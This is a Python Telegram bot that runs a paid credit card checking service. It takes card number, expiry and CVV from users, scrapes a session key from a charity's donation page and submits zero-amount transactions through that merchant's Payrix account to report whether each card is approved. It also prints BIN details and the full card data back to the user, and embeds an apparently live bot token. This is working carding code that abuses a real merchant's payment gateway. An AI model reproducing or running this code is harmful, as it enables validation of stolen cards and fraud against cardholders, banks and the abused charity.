import requests
from bs4 import BeautifulSoup
import telebot
import time
import threading
from datetime import datetime, timedelta
import os
import json

# Initialize the Telegram bot
bot = telebot.TeleBot("7195510626:AAHdF4spBrcmWPPx9-1gogU1yKM1Rs5qe-s")

# Owner's Telegram ID
OWNER_ID = 6460703454

# File to store user data
USER_DATA_FILE = "user_data.json"
if not os.path.exists(USER_DATA_FILE):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump({"premium_users": {}, "free_users": {}}, f)

# Load user data safely
def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as f:
            content = f.read().strip()
            return json.loads(content) if content else {"premium_users": {}, "free_users": {}}
    except (json.JSONDecodeError, FileNotFoundError):
        return {"premium_users": {}, "free_users": {}}

# Save user data
def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f)

# Plans configuration
PLANS = {
    "1": {"name": "𝗕𝗮𝘀𝗶𝗰 𝗣𝗿𝗲𝗺𝗶𝘂𝗺", "cooldown": 15, "hourly_limit": 50},
    "2": {"name": "𝗠𝗶𝗱-𝗧𝗶𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺", "cooldown": 13, "hourly_limit": 100},
    "3": {"name": "𝗧𝗼𝗽-𝗧𝗶𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺", "cooldown": 7, "hourly_limit": 150}
}
FREE_COOLDOWN = 30
FREE_HOURLY_LIMIT = 10

# Function to fetch BIN info
def get_bin_info(card_number):
    bin_number = card_number[:6]
    try:
        url = f"https://api.juspay.in/cardbins/{bin_number}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return {
                "brand": data.get("brand", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "type": data.get("type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "sub_type": data.get("card_sub_type", "�_U𝗻𝗸𝗻𝗼𝘄𝗻"),
                "bank": data.get("bank", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "country": data.get("country", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "country_code": data.get("country_code", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
            }
    except Exception as e:
        print(f"BIN API Error: {str(e)}")
    return {"brand": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "type": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "sub_type": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "bank": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "country": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "country_code": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"}

# Function to process payment
def process_payment(card_number, exp_month, exp_year, cvv):
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    elif len(exp_year) != 2:
        raise ValueError("𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻 𝘆𝗲𝗮𝗿 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗬𝗬 𝗼𝗿 𝗬𝗬𝗬𝗬 𝗳𝗼𝗿𝗺𝗮𝘁")

    try:
        url1 = "https://donate.givedirect.org"
        params = {'cid': "15724"}
        headers1 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Cache-Control': "max-age=0",
            'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'Upgrade-Insecure-Requests': "1",
            'Sec-Fetch-Site': "cross-site",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
            'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
        }
        response1 = requests.get(url1, params=params, headers=headers1)
        soup = BeautifulSoup(response1.text, 'html.parser')
        txnsession_key = soup.find('input', {'id': 'txnsession_key'})['value']

        url2 = "https://api.payrix.com/txns"
        payload = {
            'origin': "1",
            'merchant': "p1_mer_669021f7e934f033d1bc84f",
            'type': "2",
            'total': "0",
            'description': "donate live site, p1_tss_67dc2d794c04afc058f2557",
            'payment[number]': card_number,
            'payment[cvv]': cvv,
            'expiration': f"{exp_month}{exp_year}",
            'zip': "",
            'last': "Tech"
        }
        headers2 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            'sec-ch-ua-mobile': "?1",
            'txnsessionkey': txnsession_key,
            'x-requested-with': "XMLHttpRequest"
        }
        response2 = requests.post(url2, data=payload, headers=headers2)
        response_json = response2.json()
        errors = response_json['response']['errors']

        if errors:
            error_msg = errors[0]['msg']
            if error_msg == "Transaction declined: No 'To' Account Specified":
                return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱, 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿"
            else:
                return error_msg
        else:
            return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
    except Exception as e:
        print(f"Payment API Error: {str(e)}")
        return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱 𝘄𝗵𝗶𝗹𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗮𝗿𝗱."

# Function to update loading bar
def update_loading_bar(chat_id, message_id, start_time, done_event):
    bar_length = 20
    stages = ["𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗽𝗮𝘆𝗺𝗲𝗻𝘁...", "𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗕𝗜𝗡 𝗶𝗻𝗳𝗼...", "𝗙𝗶𝗻𝗮𝗹𝗶𝘇𝗶𝗻𝗴..."]
    while not done_event.is_set():
        elapsed_time = time.time() - start_time
        if elapsed_time > 15:
            break
        progress = min(int((elapsed_time / 10) * 100), 100)
        filled = int(bar_length * progress / 100)
        bar = "█" * filled + "░" * (bar_length - filled)
        stage_index = min(int(elapsed_time / 3), len(stages) - 1)
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"{stages[stage_index]}\n[{bar}] {progress}%\n𝗘𝗹𝗮𝗽𝘀𝗲𝗱: {elapsed_time:.1f}𝘀"
        )
        time.sleep(0.5)

# Check cooldown and hourly limit
def can_user_check(user_id):
    user_data = load_user_data()
    now = datetime.now()
    
    if user_id == OWNER_ID:
        return True, None
    
    premium_users = user_data["premium_users"]
    free_users = user_data["free_users"]
    
    if str(user_id) in premium_users:
        plan_id = premium_users[str(user_id)]["plan_id"]
        cooldown = PLANS[plan_id]["cooldown"]
        hourly_limit = PLANS[plan_id]["hourly_limit"]
        last_check = premium_users[str(user_id)].get("last_check", 0)
        checks = premium_users[str(user_id)].get("checks", [])
        checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
        premium_users[str(user_id)]["checks"] = checks
        
        if now.timestamp() - last_check < cooldown:
            return False, f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 {cooldown - int(now.timestamp() - last_check)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
        if hourly_limit != float('inf') and len(checks) >= hourly_limit:
            return False, "𝗛𝗼𝘂𝗿𝗹𝘆 𝗹𝗶𝗺𝗶𝘁 𝗿𝗲𝗮𝗰𝗵𝗲𝗱. 𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝗼𝗿 𝘄𝗮𝗶𝘁."
        
        premium_users[str(user_id)]["last_check"] = now.timestamp()
        premium_users[str(user_id)]["checks"].append(now.isoformat())
        save_user_data(user_data)
        return True, None
    
    else:
        last_check = free_users.get(str(user_id), {}).get("last_check", 0)
        checks = free_users.get(str(user_id), {}).get("checks", [])
        checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
        if str(user_id) not in free_users:
            free_users[str(user_id)] = {"last_check": 0, "checks": []}
        free_users[str(user_id)]["checks"] = checks
        
        if now.timestamp() - last_check < FREE_COOLDOWN:
            return False, f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 {FREE_COOLDOWN - int(now.timestamp() - last_check)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
        if len(checks) >= FREE_HOURLY_LIMIT:
            return False, "�_H𝗼𝘂𝗿𝗹𝘆 𝗹𝗶𝗺𝗶𝘁 𝗼𝗳 𝟭𝟬 𝗰𝗵𝗲𝗰𝗸𝘀 𝗿𝗲𝗮𝗰𝗵𝗲𝗱. 𝗕𝗲𝗰𝗼𝗺𝗲 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲."
        
        free_users[str(user_id)]["last_check"] = now.timestamp()
        free_users[str(user_id)]["checks"].append(now.isoformat())
        save_user_data(user_data)
        return True, None

# Handler for hrk command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'hrk')
def handle_hrk(message):
    start_time = time.time()
    user_id = message.from_user.id
    cmd = message.text.split()[0].lstrip('/.!').lower()
    if cmd != "hrk":
        return
    
    can_check, error_msg = can_user_check(user_id)
    if not can_check:
        bot.reply_to(message, error_msg)
        return
    
    # Check if there are arguments after the command
    if len(message.text.split(" ", 1)) < 2:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: /𝗵𝗿𝗸 𝗰𝗮𝗿𝗱_𝗻𝘂𝗺𝗯𝗲𝗿|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩")
        return
    
    done_event = threading.Event()  # Initialize done_event outside try block
    try:
        parts = message.text.split(" ", 1)[1].split("|")
        if len(parts) != 4:
            bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: /𝗵𝗿𝗸 𝗰𝗮𝗿𝗱_𝗻𝘂𝗺𝗯𝗲𝗿|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩")
            return
        
        card_number, exp_month, exp_year, cvv = parts
        loading_message = bot.reply_to(message, "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗽𝗮𝘆𝗺𝗲𝗻𝘁...\n[░░░░░░░░░░░░░░░░░░░░] 𝟬%\n𝗘𝗹𝗮𝗽𝘀𝗲𝗱: 𝟬.𝟬𝘀")
        
        loading_thread = threading.Thread(
            target=update_loading_bar,
            args=(message.chat.id, loading_message.message_id, start_time, done_event)
        )
        loading_thread.start()
        
        response_msg = process_payment(card_number, exp_month, exp_year, cvv)
        bin_info = get_bin_info(card_number)
        time_taken = f"{time.time() - start_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
        done_event.set()
        
        if response_msg == "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅":
            response = (
                f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n"
                f"𝗖𝗖 ⇾ {card_number}|{exp_month}|{exp_year}|{cvv}\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 𝗛𝗥𝗞'𝗦 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗔𝗨𝗧𝗛\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_msg}\n\n"
                f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['sub_type']}\n"
                f"𝗕𝗮𝗻𝗸: {bin_info['bank']}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']}\n\n"
                f"𝗧𝗼𝗼𝗸 {time_taken}"
            )
        else:
            response = (
                f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n"
                f"𝗖𝗖 ⇾ {card_number}|{exp_month}|{exp_year}|{cvv}\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 𝗛𝗥𝗞'𝗦 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗔𝗨𝗧𝗛\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_msg}\n\n"
                f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['sub_type']}\n"
                f"𝗕𝗮𝗻𝗸: {bin_info['bank']}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']}\n\n"
                f"𝗧𝗼𝗼𝗸 {time_taken}"
            )
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_message.message_id, text=response)
    
    except Exception as e:
        done_event.set()  # Safe to call since it's initialized outside
        bot.reply_to(message, "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        print(f"Error processing command from user {user_id}: {str(e)}")

# Handler for plan command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'plan')
def handle_plan(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
        return
    
    try:
        _, user_id, plan_id = message.text.split()
        user_id = int(user_id)
        if plan_id not in PLANS:
            bot.reply_to(message, f"𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗹𝗮𝗻 𝗜𝗗. 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗽𝗹𝗮𝗻𝘀: {', '.join(PLANS.keys())}")
            return
        
        user_data = load_user_data()
        user_data["premium_users"][str(user_id)] = {
            "plan_id": plan_id,
            "last_check": 0,
            "checks": []
        }
        save_user_data(user_data)
        bot.reply_to(message, f"𝗨𝘀𝗲𝗿 {user_id} 𝗮𝘀𝘀𝗶𝗴𝗻𝗲𝗱 𝘁𝗼 {PLANS[plan_id]['name']} (𝗣𝗹𝗮𝗻 {plan_id}).")
    except ValueError:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗽𝗹𝗮𝗻 𝘂𝘀𝗲𝗿_𝗶𝗱 𝗽𝗹𝗮𝗻_𝗶𝗱")

# Handler for info command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'info')
def handle_info(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    now = datetime.now()

    if int(user_id) == OWNER_ID:
        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: 𝗢𝘄𝗻𝗲𝗿 (𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀 🚀)\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝗡𝗼𝗻𝗲\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: 𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝗲\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: 𝗡𝗼𝘁 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝗯𝗹𝗲"
        )
    
    elif user_id in user_data["premium_users"]:
        user_info = user_data["premium_users"][user_id]
        plan_id = user_info["plan_id"]
        plan = PLANS[plan_id]
        cooldown = plan["cooldown"]
        hourly_limit = plan["hourly_limit"]
        checks = user_info.get("checks", [])
        
        valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
        remaining_checks = max(hourly_limit - len(valid_checks), 0)
        
        if valid_checks:
            next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
            time_until_reset = str(next_reset_time - now).split('.')[0]
        else:
            time_until_reset = "𝗥𝗲𝘀𝗲𝘁𝘀 𝗼𝗻 𝗻𝗲𝘅𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁"

        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: {plan['name']}\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {hourly_limit}\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
        )
    
    else:
        user_info = user_data["free_users"].get(user_id, {})
        last_check = user_info.get("last_check", 0)
        checks = user_info.get("checks", [])
        
        valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
        remaining_checks = max(FREE_HOURLY_LIMIT - len(valid_checks), 0)
        
        if valid_checks:
            next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
            time_until_reset = str(next_reset_time - now).split('.')[0]
        else:
            time_until_reset = "𝗥𝗲𝘀𝗲𝘁𝘀 𝗼𝗻 𝗻𝗲𝘅𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁"

        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: 𝗙𝗿𝗲𝗲 𝗨𝘀𝗲𝗿\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {FREE_COOLDOWN} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {FREE_HOURLY_LIMIT}\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
        )
    
    bot.reply_to(message, response)

# Handler for start command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'start')
def handle_start(message):
    user_id = message.from_user.id
    response = (
        f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗥𝗞'𝘀 𝗕𝗼𝘁, {message.from_user.first_name}!\n\n"
        f"⚡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        f"📌 /𝗵𝗿𝗸 𝗰𝗮𝗿𝗱|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩 - 𝗖𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱\n"
        f"📌 /𝗶𝗻𝗳𝗼 - 𝗣𝗹𝗮𝗻 𝗶𝗻𝗳𝗼\n"
        f"🚀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗣𝗹𝗮𝗻𝘀:\n"
        f"🔹 𝗕𝗮𝘀𝗶𝗰: 𝟭𝟱𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟱𝟬/𝗵𝗿\n"
        f"🔹 𝗠𝗶𝗱-𝗧𝗶𝗲𝗿: 𝟭𝟯𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬𝟬/𝗵𝗿\n"
        f"🔹 𝗧𝗼𝗽-𝗧𝗶𝗲𝗿: 𝟳𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟱𝟬/𝗵𝗿\n"
        f"🔄 𝗙𝗿𝗲𝗲: 𝟯𝟬𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬/𝗵𝗿"
    )
    
    bot.reply_to(message, response)

# Start the bot
bot.polling()
